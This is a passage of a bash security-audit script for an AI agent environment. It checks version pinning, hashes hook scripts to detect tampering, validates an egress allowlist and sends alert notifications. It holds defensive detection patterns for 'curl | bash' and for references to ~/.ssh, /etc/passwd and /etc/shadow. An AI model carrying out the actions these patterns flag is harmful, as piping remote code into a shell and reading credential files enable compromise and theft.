  # CRITICAL: do NOT pipe into `while read` here. In bash, a pipe creates a
  # subshell for the right-hand side, so any FINDINGS/SEVERITY mutations
  # inside the loop are lost when the subshell exits. (HIGH-2 from PR #56
  # Codex R2 — release-age findings used to silently disappear.) Use process
  # substitution `< <(...)` instead, which keeps the loop in the parent shell.
  while IFS=$'\t' read -r sev id pkg_spec rest; do
    [[ -z "$sev" ]] && continue
    local justify_target="$pkg_spec"
    [[ "$justify_target" == "-" || -z "$justify_target" ]] && justify_target="<pkg>@<version>"
    # `${sev,,}` is bash 4+ syntax. Use tr for bash 3.2 compatibility.
    local sev_lower
    sev_lower="$(printf '%s' "$sev" | tr '[:upper:]' '[:lower:]')"
    case "$sev_lower" in
      info) finding info "$id" "$rest" \
              "Use 'walter-os justify ${justify_target} --reason=...' to exempt" ;;
      high) finding high "$id" "$rest" \
              "Use 'walter-os justify ${justify_target} --reason=...' to exempt, or wait for min age" ;;
    esac
  done < <(printf '%s\n' "$release_age_rows")
}

# ---------- 7. Pin check (formerly 6) ----------

check_pinning() {
  # Inspect ~/.claude/settings.json mcpServers for unpinned versions.
  #
  # Detection logic lives in scripts/check-pinning.py so it can be tested in
  # isolation against fixture settings.json files (tests/audit/check-pinning.bats).
  # Previous jq-based filter falsely flagged every npx server because its regex
  # matched the `-y` flag — see commit history for the rewrite.
  local settings="${CLAUDE_HOME}/settings.json"
  command -v python3 >/dev/null 2>&1 || return 0

  local helper="${BASH_SOURCE[0]%/*}/check-pinning.py"
  [[ -f "$helper" ]] || return 0

  local unpinned=""
  if [[ -f "$settings" ]]; then
    unpinned="$(python3 "$helper" "$settings" 2>/dev/null | paste -sd, -)"
  fi

  if [[ -n "$unpinned" ]]; then
    finding high "unpinned-mcps" \
      "MCP servers without pinned versions: ${unpinned}" \
      "Use exact semver only ('package@x.y.z' for npm, 'package==x.y.z' for uvx, or 'pkg#<commit-sha>' for git). Ranges, dist-tags ('@latest', '@beta'), and PEP-440 operators other than '==' are rejected."
  fi

  local walter_home="${WALTER_OS_HOME:-}"
  if [[ -z "$walter_home" ]]; then
    walter_home="$(cd "${BASH_SOURCE[0]%/*}/../../.." && pwd)"
  fi
  local manifest="${walter_home}/skills/daily-supply-chain-audit/assets/pinned-refs.toml"
  local skills_root="${walter_home}/skills"
  if [[ -n "$walter_home" && -d "$skills_root" ]]; then
    local vendored_findings
    vendored_findings="$(python3 "$helper" --vendored-skills "$manifest" "$skills_root" 2>/dev/null | paste -sd';' -)"
    if [[ -n "$vendored_findings" ]]; then
      finding high "vendored-skill-pin-drift" \
        "Vendored skill pin manifest issues: ${vendored_findings}" \
        "Review the vendored skill change, update skills/daily-supply-chain-audit/assets/pinned-refs.toml with the upstream commit SHA and local content hash, then rerun walter-os audit."
    fi
  fi
}

# ---------- 8. Skill static checks ----------

check_skill_scripts() {
  # Scan ~/.claude/skills, ~/.codex/skills, AND the in-repo external/
  # submodule tree (audit P1-07 — external submodule hooks were
  # previously outside the audit perimeter).
  local skill_dirs=("${CLAUDE_HOME}/skills" "${CODEX_HOME}/skills")
  if [[ -n "${WALTER_OS_HOME:-}" && -d "${WALTER_OS_HOME}/external" ]]; then
    skill_dirs+=("${WALTER_OS_HOME}/external")
  fi

  for skills_dir in "${skill_dirs[@]}"; do
    [[ -d "$skills_dir" ]] || continue
    while IFS= read -r script; do
      # Check for dangerous patterns
      if grep -qE 'curl[^|]*\|\s*(bash|sh|zsh)' "$script" 2>/dev/null; then
        finding crit "curl-pipe-bash" \
          "Skill script $script does curl | bash" \
          "Pin and inline the script, or remove this skill"
      fi
      # shellcheck disable=SC2088 # this is a regex pattern matched against script CONTENT, not a path
      if grep -qE '~/\.ssh|/etc/passwd|/etc/shadow' "$script" 2>/dev/null; then
        finding high "sensitive-fs-access" \
          "Skill script $script references sensitive paths" \
          "Audit the script's intent before allowing it to run"
      fi
    done < <(find "$skills_dir" -type f \( -name '*.sh' -o -name '*.py' -o -name '*.js' \) 2>/dev/null)
  done
}

# ---------- 8b. External submodule hook integrity (P1-07) ----------
#
# `external/**/hooks/scripts/*.sh` execute at SessionStart, PostToolUse,
# and PreCompact under operator credentials. They are loaded via the
# plugin marketplace and may not appear in ~/.claude/settings.json's
# checksum table. We snapshot their sha256 at first run and fire CRIT
# on any subsequent drift — a malicious commit to the submodule (or a
# tampered checkout) is caught before the next session start.

check_external_hooks() {
  [[ -n "${WALTER_OS_HOME:-}" && -d "${WALTER_OS_HOME}/external" ]] || return 0

  # jq is REQUIRED — the pipeline downstream parses hasher output via jq
  # and serializes the baseline JSON. If jq is missing we cannot make a
  # security decision; fail HIGH and refuse to silently disable the
  # integrity gate. Copilot R1 finding on PR #90.
  if ! command -v jq >/dev/null 2>&1; then
    finding high "external-hook-integrity-skipped" \
      "jq missing — external-hook integrity gate disabled. Install jq." \
      "brew install jq (macOS) / apt install jq (Linux)"
    return 0
  fi

  # Resolve sha256sum invocation per platform. Use an array so the
  # multi-arg `shasum -a 256` form splits correctly under shellcheck-
  # clean quoting in the pipeline below.
  local -a hasher_cmd=()
  if command -v sha256sum >/dev/null 2>&1; then
    hasher_cmd=(sha256sum)
  elif command -v shasum >/dev/null 2>&1; then
    hasher_cmd=(shasum -a 256)
  else
    finding high "external-hook-integrity-skipped" \
      "Neither sha256sum nor shasum installed — cannot verify external hook integrity" \
      "Install coreutils (Linux) or rely on macOS default shasum"
    return 0
  fi

  local baseline="${WALTER_CONFIG}/external-hook-checksums.json"
  local current_tmp
  current_tmp="$(mktemp)"

  # Hash every external hook script.
  #
  # Use `find -print0` + `xargs -0 --no-run-if-empty` so the hasher is
  # NOT invoked when zero files match — without --no-run-if-empty, GNU
  # xargs runs the hasher once with no args, the hasher reads stdin
  # (empty) and emits a synthetic "<hash>  -" line, polluting the
  # baseline. Copilot R1 finding on PR #90.
  #
  # macOS xargs (BSD) doesn't support --no-run-if-empty; fall back to
  # a manual file-count check before invoking the pipeline. Detect via
  # `xargs --no-run-if-empty </dev/null 2>/dev/null` which returns 0
  # iff the flag is supported.
  local -a xargs_cmd=(xargs -0)
  if printf '' | xargs --no-run-if-empty -0 true 2>/dev/null; then
    xargs_cmd+=(--no-run-if-empty)
  else
    # BSD xargs path: pre-check whether there's at least one match.
    local first_file
    first_file="$(find "${WALTER_OS_HOME}/external" \
      -type f \
      -path '*/hooks/scripts/*' \
      \( -name '*.sh' -o -name '*.py' -o -name '*.js' \) \
      -print 2>/dev/null \
      | head -1)"
    if [[ -z "$first_file" ]]; then
      rm -f "$current_tmp"
      return 0
    fi
  fi

  # The jq script parses each hasher output line robustly. Both
  # sha256sum (GNU) and `shasum -a 256` (macOS) emit
  #   <64-hex-chars><whitespace><path>
  # We capture the 64-hex hash via a regex anchored to start-of-line
  # plus a single capture group for the path (everything after the
  # whitespace). This avoids the previous `split("  ")` hack which
  # was sensitive to delimiter width (one vs two spaces between BSD
  # vs GNU tools) and which truncated paths containing double-space
  # sequences. Copilot R1 finding on PR #90.
  #
  # Output JSON is normalized via `--sort-keys` so the baseline is
  # stable across jq versions and object-insertion order. Copilot
  # R1 finding on PR #90.
  find "${WALTER_OS_HOME}/external" \
    -type f \
    -path '*/hooks/scripts/*' \
    \( -name '*.sh' -o -name '*.py' -o -name '*.js' \) \
    -print0 2>/dev/null \
    | LC_ALL=C sort -z \
    | "${xargs_cmd[@]}" "${hasher_cmd[@]}" 2>/dev/null \
    | jq -R --slurp --sort-keys '
        split("\n")
        | map(select(length > 0))
        | map(capture("^(?<hash>[0-9a-f]{64})[[:space:]]+\\*?(?<path>.+)$"))
        | map({(.path | sub("^.*/external/"; "external/")): .hash})
        | add // {}
      ' \
    > "$current_tmp"

  if [[ ! -s "$current_tmp" ]]; then
    rm -f "$current_tmp"
    return 0   # No external hook scripts → nothing to check.
  fi

  if [[ ! -f "$baseline" ]]; then
    # First run — snapshot silently. Future runs compare against this.
    mv "$current_tmp" "$baseline"
    return 0
  fi

  if ! diff -q "$baseline" "$current_tmp" >/dev/null 2>&1; then
    local diff_summary
    diff_summary="$(diff "$baseline" "$current_tmp" 2>/dev/null | head -20 | tr '\n' ' ')"
    finding crit "external-hook-tampered" \
      "External submodule hook scripts changed since baseline. diff: ${diff_summary}" \
      "Review the change. If intentional (e.g. submodule SHA bump after security review): walter-os baseline-external-hooks"
  fi
  rm -f "$current_tmp"
}

# ---------- 8c. Egress allowlist sanity (#122 OSS Trust A-2, AC-5) ----------
#
# Three checks against the operator's ~/.config/walter-os/egress-allowlist.txt:
#   1. File missing → info finding (operator hasn't opted in; that's fine
#      on day 0, but worth surfacing once a day so it doesn't sit forever).
#   2. File present but empty (all comments/blanks) → info finding (every
#      outbound call is blocked — usually a misconfig).
#   3. Any allowlist entry whose host resolves to a private / loopback /
#      link-local IP → high finding (DNS-rebinding risk: an attacker who
#      controls DNS for the host can redirect calls inside the operator's
#      LAN). Pure DNS lookup, no probe-traffic.
#
# Sibling pattern: this check ALSO snapshots the file's SHA256 alongside
# the other config-drift baselines, so drift between audit runs is
# reported by check_config_drift. We don't duplicate that here.
check_egress_allowlist() {
  local cfg="${WALTER_CONFIG:-${HOME}/.config/walter-os}"
  local allowlist="$cfg/egress-allowlist.txt"

  if [[ ! -f "$allowlist" ]]; then
    finding info "egress-allowlist-missing" \
      "No egress allowlist at $allowlist — network-gate hook blocks every outbound call from the agent." \
      "Import the bundled example: walter-os egress import \"\${WALTER_OS_HOME}/contexts/_examples/egress-allowlist.example.txt\""
    return 0
  fi

  # Count non-blank, non-comment lines. awk over grep here because
  # `grep -c` exits non-zero on no-match which combined with `||` would
  # corrupt the variable on empty files (`entry_count` could become
  # "0\n0" — fails arithmetic comparison).
  local entry_count
  entry_count="$(awk '/^[[:space:]]*(#|$)/ {next} {n++} END {print n+0}' "$allowlist" 2>/dev/null)"
  if [[ "${entry_count:-0}" -eq 0 ]]; then
    finding info "egress-allowlist-empty" \
      "Egress allowlist at $allowlist exists but has no entries — network-gate blocks every outbound call." \
      "Add hosts via: walter-os egress add <host>  OR  walter-os egress import <path>"
    return 0
  fi

  # Private-IP rebinding check. Per-entry DNS lookup; treat resolver
  # failures as benign (the host may legitimately be unreachable from
  # the audit host but reachable from where the agent runs). Only flag
  # SUCCESSFUL lookups that land on private space.
  local resolver=""
  if command -v getent >/dev/null 2>&1; then
    resolver="getent"
  elif command -v dscacheutil >/dev/null 2>&1; then
    resolver="dscacheutil"
  elif command -v dig >/dev/null 2>&1; then
    resolver="dig"
  fi
  [[ -z "$resolver" ]] && return 0  # no resolver → skip (no false-positives)

  local entry private_hits=""
  while IFS= read -r entry; do
    entry="${entry#"${entry%%[![:space:]]*}"}"
    entry="${entry%"${entry##*[![:space:]]}"}"
    [[ -z "$entry" || "${entry:0:1}" == "#" ]] && continue
    # Skip wildcard patterns + IPv4/IPv6 literals. Codex R7 finding
    # CR7-B: the remediation says operators can document an
    # intentional private target by replacing the hostname with a
    # literal IP, but IPv4 literals (`192.168.1.10`, `127.0.0.1`)
    # were still resolved through DNS (no-op for literals) and
    # reported as high findings, so operators who followed the
    # remediation kept getting the same alert daily. Treat IPv4 +
    # IPv6 literals as operator-explicit (they wrote the IP, they
    # know).
    case "$entry" in
      \**|*\**) continue ;;       # wildcard
      \[*\]) continue ;;          # IPv6 literal
    esac
    if [[ "$entry" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
      continue                     # IPv4 literal — operator-explicit
    fi
    # Resolve ALL addresses, not just the first. Copilot R3 finding: a
    # host whose first A/AAAA record is public but whose second is
    # 10.x.x.x would otherwise miss the rebinding-risk check.
    local all_ips=""
    case "$resolver" in
      getent)
        all_ips="$(getent ahosts "$entry" 2>/dev/null | awk '{print $1}')" ;;
      dscacheutil)
        all_ips="$(dscacheutil -q host -a name "$entry" 2>/dev/null | awk '/^ip(v6)?_address:/ {print $2}')" ;;
      dig)
        all_ips="$(
          {
            dig +short +time=2 +tries=1 "$entry" A
            dig +short +time=2 +tries=1 "$entry" AAAA
          } 2>/dev/null | awk '/^[0-9a-fA-F.:]+$/'
        )" ;;
    esac
    [[ -z "$all_ips" ]] && continue
    # Private / loopback / link-local IPv4 ranges + IPv6 ULA/loopback/
    # link-local (fc00::/7, fd00::/8, ::1, fe80::/10).
    local ip
    while IFS= read -r ip; do
      [[ -z "$ip" ]] && continue
      case "$ip" in
        10.*|127.*|169.254.*|192.168.*) private_hits+="$entry → $ip; " ;;
        172.1[6-9].*|172.2[0-9].*|172.3[01].*) private_hits+="$entry → $ip; " ;;
        ::1|fc??:*|fd??:*|fe8?:*|fe9?:*|fea?:*|feb?:*) private_hits+="$entry → $ip; " ;;
      esac
    done <<< "$all_ips"
  done < "$allowlist"

  if [[ -n "$private_hits" ]]; then
    finding high "egress-allowlist-private-ip" \
      "Allowlist entries resolve to private/loopback/link-local IPs (DNS-rebinding risk): ${private_hits}" \
      "Either remove the entry (walter-os egress remove <host>) OR document the intent (replace the host with an IP literal: walter-os egress add <literal-ip>)."
  fi
}

# ---------- 9. Notifications ----------

notify() {
  local summary="$1"
  if [[ -n "${WALTER_TELEGRAM_BOT_TOKEN:-}" && -n "${WALTER_TELEGRAM_CHAT_ID:-}" ]]; then
    curl -sS -X POST "https://api.telegram.org/bot${WALTER_TELEGRAM_BOT_TOKEN}/sendMessage" \
      -d "chat_id=${WALTER_TELEGRAM_CHAT_ID}" \
      -d "text=Walter-OS audit ${TODAY}: ${summary}" >/dev/null 2>&1 || true
  fi
  if [[ -n "${WALTER_SLACK_WEBHOOK:-}" ]]; then
    curl -sS -X POST "${WALTER_SLACK_WEBHOOK}" \
      -H 'Content-Type: application/json' \
      -d "{\"text\":\"Walter-OS audit ${TODAY}: ${summary}\"}" >/dev/null 2>&1 || true
  fi
}

# ---------- main ----------

main() {
  check_versions
  check_config_drift
  check_secrets_in_configs
  check_hooks
  check_mcp_scanners
  check_tool_definitions
  check_pinning
  check_min_release_age
  check_skill_scripts
  check_external_hooks
  check_egress_allowlist

  # Write report
  {
    echo "# Walter-OS Supply Chain Audit"
    echo
    echo "**Date**: ${TODAY}"
    echo "**Severity**: ${SEVERITY} (0=clean, 1=info, 2=high, 3=critical)"
    echo "**Counts**: info=${INFO_COUNT}, high=${HIGH_COUNT}, critical=${CRIT_COUNT}"
    echo
    echo "## Findings"
    echo
    if [[ ${#FINDINGS[@]} -eq 0 ]]; then
      echo "_No findings. System clean._"
    else
      for f in "${FINDINGS[@]}"; do
        echo "$f"
      done
    fi
    echo
    echo "## Triage"
    echo
    case "$SEVERITY" in
      0) echo "✅ Proceed with work." ;;
      1) echo "ℹ️  Informational only. No action required to start work." ;;
      2) echo "⚠️  HIGH-severity findings. Acknowledge with \`walter-os ack <id>\` or fix before continuing." ;;
      3) echo "🚨 CRITICAL findings. WORK BLOCKED. Triage manually." ;;
    esac
  } > "$REPORT"

  # Status JSON
  cat > "$STATUS" <<EOF
{
  "date": "${TODAY}",
  "severity": ${SEVERITY},
  "info": ${INFO_COUNT},
  "high": ${HIGH_COUNT},
  "critical": ${CRIT_COUNT},
  "report": "${REPORT}"
}
EOF

  local summary="severity=${SEVERITY} info=${INFO_COUNT} high=${HIGH_COUNT} critical=${CRIT_COUNT}"
  echo "$summary"
  echo "Report: $REPORT"

  if [[ "$SEVERITY" -ge 2 ]]; then
    notify "$summary — see $REPORT"
  fi

  exit "$SEVERITY"
}

# Only run main() when invoked as a script — tests source this file to
# call individual `check_*` functions in isolation.
if [[ "${BASH_SOURCE[0]:-$0}" == "${0}" ]]; then
  main "$@"
fi
